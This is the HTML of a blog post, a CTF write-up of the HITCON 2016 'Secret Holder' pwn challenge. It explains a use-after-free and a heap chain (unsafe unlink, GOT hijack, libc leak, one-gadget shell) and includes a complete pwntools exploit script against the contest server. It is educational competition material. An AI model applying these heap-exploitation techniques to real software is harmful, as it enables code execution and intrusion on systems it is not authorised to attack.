@@ -1,0 +1,863 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Pwnable,Python,heap,use_after_free,HITCON,heap_overflow," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Category: pwnPoints: 100">
+<meta name="keywords" content="CTF,Pwnable,Python,heap,use_after_free,HITCON,heap_overflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON CTF 2016 Quals -- Secret Holder">
+<meta property="og:url" content="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-secret-holder/index.html">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:description" content="Category: pwnPoints: 100">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-01-03T15:08:05.599Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCON CTF 2016 Quals -- Secret Holder">
+<meta name="twitter:description" content="Category: pwnPoints: 100">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-secret-holder/"/>
+
+
+
+
+
+  <title>HITCON CTF 2016 Quals -- Secret Holder | Hacking Tube 2.0</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-100090256-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hacking Tube 2.0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Security and stuff.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-secret-holder/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bruce Chen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hacking Tube 2.0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HITCON CTF 2016 Quals -- Secret Holder</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-10T08:10:00+08:00">
+                2016-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-secret-holder/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/10/10/2016-10-10-hitcon-ctf-2016-quals-secret-holder/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>Category:</strong> pwn<br><strong>Points:</strong> 100</p>
+<a id="more"></a>  
+<p>I did not finish the challenge during the contest, but was able to solve it after the game. Damn if only I can fuzz some more…</p>
+<p>64 bit ELF,  with Partial RELRO, canary &amp; NX enabled, no PIE.<br>Program allow us to:</p>
+<ul>
+<li>keep secret : new a secret ( using <code>calloc()</code> )</li>
+<li>wipe secret : delete a secret</li>
+<li>renew secret : edit a secret</li>
+</ul>
+<p>There are three kinds of secret in the program: </p>
+<ul>
+<li><code>small</code> : secret with buffer size 40</li>
+<li><code>big</code> : secret with buffer size 4,000</li>
+<li><code>huge</code> : secret with buffer size 400,000</li>
+</ul>
+<p>There’s a Use-After-Free vulnerability in the <code>wipe</code> function:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v0 = atoi(&amp;s);</span><br><span class="line"><span class="keyword">switch</span> ( v0 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">free</span>(secret_buf_big);</span><br><span class="line">        has_keep_big = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">free</span>(secret_buf_huge);</span><br><span class="line">        has_keep_huge = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">free</span>(secret_buf_small);</span><br><span class="line">        has_keep_small = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>When wiping a secret, it does not check the <code>has_keep_XXX</code> flag ( a flag that indicates now there’s a small/big/huge secret in the program). So for example if we <code>keep(small)</code> –&gt; <code>wipe(small)</code> –&gt; <code>keep(big)</code> –&gt; <strong><code>wipe(small)</code></strong>, it will free the <code>big</code> buffer, but we can still <code>renew(big)</code></p>
+<p>During the contest I did not know how to exploit the service. I successfully overlapped the <code>small</code> and the <code>big</code> buffer, but it only made me able to overwrite the top_size, which is useless since we can’t control the size of the <code>calloc</code> function ( thus we can’t do the <a href="https://github.com/shellphish/how2heap/blob/master/house_of_force.c" target="_blank" rel="noopener">House of Force</a> attack ). I was also failed to overlapped these two buffer with the different base address ( that is, I can only overlapped <code>small</code> &amp; <code>big</code> with the same base heap address), so I was unable to overflow the heap buffer and overwrite the chunk header.  </p>
+<p>After I asked the author of this challege, I realize that the key point of solving this challenge is to <strong>exploit the <code>huge</code> and the <code>big</code>‘s memory chunk</strong>. </p>
+<p>While solving this challenge, I thought that if the malloc size was larger than <code>0x20000</code>, glibc will always use <code>mmap</code> to allocate the memory space. But I was wrong – if we <code>keep(huge)</code>–&gt; <code>wipe(huge)</code>–&gt; <code>keep(huge)</code>, we will found that the second <code>huge</code> buffer was allocated by the <code>malloc</code> function, not <code>mmap</code> !! ( Thanks to the god damn <code>sysmalloc</code> !! )</p>
+<p>So here’s how we gonna exploit it:</p>
+<ul>
+<li>Use <code>keep</code> and <code>wipe</code> to make <code>small</code> &amp; <code>huge</code> buffer be on the same heap address.</li>
+<li><code>keep(big)</code> and make <code>big</code> buffer adjacent to the end of the <code>small</code> buffer.</li>
+<li>By doing <code>renew(huge)</code>, we’ll be able to overflow the whole <code>big</code> buffer, thus we can create a fake <strong>smallbin</strong> memory chunk at the address of the <code>big</code> buffer.  </li>
+<li>By creating some fake chunks, we can use the <a href="https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c" target="_blank" rel="noopener">unsafe unlink</a> attack to overwrite <code>&amp;huge_buf</code> ( all three buffer’s address are store in the global data section ), so now the <code>huge</code>‘s buffer will be lying on the global data section.</li>
+<li>Now we can overwrite all three buffer address ( data pointer ) by doing <code>renew(huge)</code></li>
+<li><code>renew(small/huge/big)</code> to overwrite the content of any address.  </li>
+</ul>
+<p>After we overwrite the <code>huge</code>‘s buffer address, we can try to do the GOT hijacking attack. But first we’ll have to leak some address. The program itself did not output any of our input , so I decide to hijack  <code>free</code>‘s GOT first. </p>
+<p>By overwriting <code>free</code>‘s GOT into <code>puts@plt</code>, and <code>small</code>‘s buffer into <code>__libc_start_main@got.plt</code>, we are able to leak the libc’s address by doing <code>wipe(small)</code>, since it’ll call <code>free(small)</code>, which is now <code>puts(_libc_start_main@got.plt)</code>.</p>
+<p>After that we’re able to overwrite some GOT and hijack the control flow. Here I overwrite <code>puts</code>‘s GOT into the address of the <a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf" target="_blank" rel="noopener">one-gadget</a>, which will make the program spawn a shell whenever it tries to call <code>puts</code> to print out some message.  </p>
+<figure class="highlight python"><figcaption><span>exp_secret.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"52.68.31.117"</span></span><br><span class="line">PORT = <span class="number">5566</span></span><br><span class="line">ELF_PATH = <span class="string">"./secret_holder_noalarm"</span></span><br><span class="line">LIBC_PATH = <span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_recvuntil</span><span class="params">(s, delim)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myexec</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep</span><span class="params">(ch, secret)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"3. Renew secret\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"3. Huge secret\n"</span>, str(ch))</span><br><span class="line">    r.sendafter(<span class="string">"secret: \n"</span>, secret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span><span class="params">(ch)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"3. Renew secret\n"</span>, <span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"3. Huge secret\n"</span>, str(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span><span class="params">(ch, secret)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"3. Renew secret\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"3. Huge secret\n"</span>, str(ch))</span><br><span class="line">    r.sendafter(<span class="string">"secret: \n"</span>, secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    keep(<span class="number">1</span>, <span class="string">"A"</span>*<span class="number">8</span>)</span><br><span class="line">    keep(<span class="number">2</span>, <span class="string">"A"</span>*<span class="number">8</span>)</span><br><span class="line">    keep(<span class="number">3</span>, <span class="string">"A"</span>*<span class="number">8</span>)</span><br><span class="line">    wipe(<span class="number">1</span>)</span><br><span class="line">    wipe(<span class="number">2</span>)</span><br><span class="line">    wipe(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    keep(<span class="number">3</span>, <span class="string">"3"</span>*<span class="number">8</span>) <span class="comment"># now huge chunk will use malloc, not mmap!!</span></span><br><span class="line">    wipe(<span class="number">1</span>)</span><br><span class="line">    keep(<span class="number">1</span>, <span class="string">"A"</span>*<span class="number">8</span>) <span class="comment"># now huge = small</span></span><br><span class="line">    keep(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">8</span>) <span class="comment"># big will adjacent to the end of the small buffer</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x6020a8 stores the huge buffer's address</span></span><br><span class="line">    fake_fd = <span class="number">0x6020a8</span> - <span class="number">0x18</span></span><br><span class="line">    fake_bk = <span class="number">0x6020a8</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite big's chunk data with fake chunk data for unsafe unlink</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) <span class="comment"># fake prev_chunk header</span></span><br><span class="line">    payload += p64(fake_fd) + p64(fake_bk) <span class="comment"># fake fd and bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>) <span class="comment"># we are going to free here</span></span><br><span class="line">    payload += <span class="string">"B"</span>*<span class="number">0x80</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0x91</span>) <span class="comment"># fake next_chunk header</span></span><br><span class="line">    payload += <span class="string">"C"</span>*<span class="number">0x80</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0x91</span>) <span class="comment"># fake next_next_chunk header</span></span><br><span class="line">    renew(<span class="number">3</span>, payload)</span><br><span class="line">    </span><br><span class="line">    wipe(<span class="number">2</span>) <span class="comment"># free big, trigger unsafe unlink</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># now huge_buf will point to global data section</span></span><br><span class="line">    <span class="comment"># renew huge, overwrite small, big &amp; huge buffer address</span></span><br><span class="line">    payload = <span class="string">"A"</span>*<span class="number">0x10</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x6020b0</span>) <span class="comment"># &amp;small_buf</span></span><br><span class="line">    payload += p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">    renew(<span class="number">3</span>, payload)</span><br><span class="line">    </span><br><span class="line">    renew(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])) <span class="comment"># make free(buf) = puts(buf)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># make small_buf = libc_start_main got</span></span><br><span class="line">    <span class="comment"># wipe(small) = puts(small) = puts(got) = leak address</span></span><br><span class="line">    payload = p64(elf.got[<span class="string">'__libc_start_main'</span>]) + p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">    renew(<span class="number">3</span>, payload)</span><br><span class="line">    wipe(<span class="number">1</span>)</span><br><span class="line">    libc.address += u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    one_gadget = libc.address + <span class="number">0x4525a</span></span><br><span class="line">    log.success(<span class="string">"libc_base: "</span>+hex(libc.address))</span><br><span class="line">    log.success(<span class="string">"one_gadget: "</span>+hex(one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># hijack puts@got.plt, make it jump to one_gadget</span></span><br><span class="line">    payload = p64(elf.got[<span class="string">'puts'</span>]) + p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">    renew(<span class="number">3</span>, payload)</span><br><span class="line">    renew(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+<p>Such a shame that I didn’t solve this challenge …… I might be able to solve it if I did some more fuzzing…..</p>
+<p>flag: <code>hitcon{The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P}</code>   </p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
+          
+            <a href="/tags/Python/" rel="tag"># Python</a>
+          
+            <a href="/tags/heap/" rel="tag"># heap</a>
+          
+            <a href="/tags/use-after-free/" rel="tag"># use_after_free</a>
+          
+            <a href="/tags/HITCON/" rel="tag"># HITCON</a>
+          
+            <a href="/tags/heap-overflow/" rel="tag"># heap_overflow</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/09/13/2016-09-13-869100/" rel="next" title="ASIS CTF Finals 2016 -- shadow">
+                <i class="fa fa-chevron-left"></i> ASIS CTF Finals 2016 -- shadow
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-flame/" rel="prev" title="HITCON CTF 2016 Quals -- flame">
+                HITCON CTF 2016 Quals -- flame <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
+               alt="Bruce Chen" />
+          <p class="site-author-name" itemprop="name">Bruce Chen</p>
+           
+              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bruce30262" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
+                  
+                    <i class="fa fa-fw fa-facebook"></i>
+                  
+                  Facebook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      Total visitors
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      Total views
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
